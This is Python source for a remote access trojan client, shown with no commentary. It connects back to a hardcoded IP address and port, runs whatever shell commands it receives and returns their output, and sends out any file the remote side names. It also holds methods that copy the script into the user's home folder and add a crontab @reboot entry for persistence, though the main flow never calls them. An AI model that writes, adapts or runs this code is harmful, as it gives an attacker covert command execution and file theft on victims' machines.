import socket
import subprocess
from shutil import copyfile
import os
import getpass
class client:
    def __init__(self):
        self.mssg = ""
        self.host = "192.168.145.134"
        self.port = 5555
    def sck(self):
        self.s = socket.socket()
        self.conn = False
        while not self.conn:
         try:
          self.s.connect ((self.host, self.port))
          self.conn = True
         except:
          pass
         
    def spread(self):
        self.dirp = os.getcwd()
        self.getp = getpass.getuser()
        self.myfilename = os.path.basename(__file__)
        self.sr = self.dirp + "/" + self.myfilename
        self.ds = "/home/" + self.getp + "/temp.py"
        copyfile(self.sr,self.ds)
    def Cboot(self):
        self.mycmd = 'echo "@reboot python" '+ self.ds + '  > hhh && crontab hhh'
        os.system(self.mycmd)
    def commande(self):
        while True:
             self.data = self.s.recv(1024)
             if not self.data:
              break
             self.cmd = subprocess.Popen(self.data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             self.cmd_bytes = self.cmd.stdout.read() + self.cmd.stderr.read()
             self.cmd_str = str(self.cmd_bytes.decode())
             if not self.cmd_str:
              self.s.sendall("erreur")
             else:
              print(self.data)
              self.s.sendall(self.cmd_str.encode("utf-8"))
    def filemanager(self):
        while True:
            self.filename = self.s.recv(1024)
            self.f = open(self.filename ,'rb')
            self.i = self.f.read(1024)
            while(self.i):
                self.s.send(self.i)
                self.i = self.f.read(1024)
            self.f.close()
              
cli = client()     
cli.sck()
choice = cli.s.recv(1024)
choice = choice.decode()
if (choice == "1"):
    cli.commande()
elif (choice == "2"):
    cli.filemanager()

cli.s.close()